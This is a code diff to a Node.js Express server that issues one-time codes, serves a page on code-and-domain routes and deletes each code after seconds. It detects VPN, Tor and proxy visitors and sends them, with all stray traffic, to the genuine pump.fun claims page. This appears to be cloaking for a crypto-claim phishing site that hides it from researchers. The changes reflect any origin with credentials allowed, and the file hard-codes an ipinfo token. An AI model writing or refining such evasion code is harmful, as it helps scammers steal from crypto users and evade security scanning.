@@ -4,14 +4,23 @@ const path = require("path");
 const crypto = require("crypto");
 const axios = require("axios");
 const app = express();
-const PORT = 3000; // Changed from 80 to 3000
+const PORT = 3000;
 
 // Add this line to handle proxied requests
 app.set("trust proxy", true);
 
+// Configure CORS properly
 app.use(cors({
-    origin: '*'
+    origin: true, // This allows any origin but reflects the request origin
+    credentials: true,
+    methods: ['GET', 'POST', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization'],
+    maxAge: 86400 // 24 hours
 }));
+
+// Add explicit OPTIONS handling for preflight requests
+app.options('*', cors());
+
 // Store valid codes in memory: { [codeString]: true }
 const IPINFO_TOKEN = "7021f1174d85bb"; // Get from ipinfo.io
 const activeCodes = {};
@@ -32,15 +41,20 @@ const ipinfoCheck = async (req, res, next) => {
     const { privacy } = response.data;
 
     // Check privacy flags
-    if (privacy.vpn || privacy.proxy || privacy.tor || privacy.relay) {
+    if (privacy && (privacy.vpn || privacy.proxy || privacy.tor || privacy.relay)) {
       console.log(`Redirected IP: ${clientIP}`, privacy);
+      // Instead of redirect, send error response for AJAX requests
+      if (req.xhr || req.headers.accept?.includes('application/json')) {
+        return res.status(403).json({ error: 'Access denied' });
+      }
       return res.redirect("https://pump.fun/claims");
     }
 
     next();
   } catch (error) {
     console.error("check failed:", error);
-    return res.redirect("https://pump.fun/claims");
+    // Continue if ipinfo check fails
+    next();
   }
 };
 
@@ -50,6 +64,11 @@ const ipinfoCheck = async (req, res, next) => {
 app.get("/generateLink", ipinfoCheck, (req, res) => {
   const code = crypto.randomBytes(8).toString("hex");
   activeCodes[code] = true;
+  
+  // Set explicit CORS headers
+  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
+  res.setHeader('Access-Control-Allow-Credentials', 'true');
+  
   res.json({ code });
 });
 
@@ -108,6 +127,8 @@ app.get("/:code/:domain", (req, res) => {
     console.log(
       `[${new Date().toISOString()}] INDEX ROUTE -> index.html served OK! Will delete code in 3s...`
     );
+    
+    // Fixed the timeout value (was 3000000000, should be 3000 for 3 seconds)
     setTimeout(() => {
       if (activeCodes[code]) {
         delete activeCodes[code];
@@ -119,7 +140,7 @@ app.get("/:code/:domain", (req, res) => {
           `[${new Date().toISOString()}] INDEX ROUTE -> CODE "${code}" was ALREADY gone?`
         );
       }
-    }, 3000000000);
+    }, 3000);
   });
 });
 
@@ -147,6 +168,12 @@ app.use((req, res) => {
     } => redirect to solanaguides`
   );
   return res.redirect("https://pump.fun/claims");
+});
+
+// Add error handling
+app.use((err, req, res, next) => {
+  console.error('Server error:', err);
+  res.status(500).json({ error: 'Internal server error' });
 });
 
 app.listen(PORT, () => {
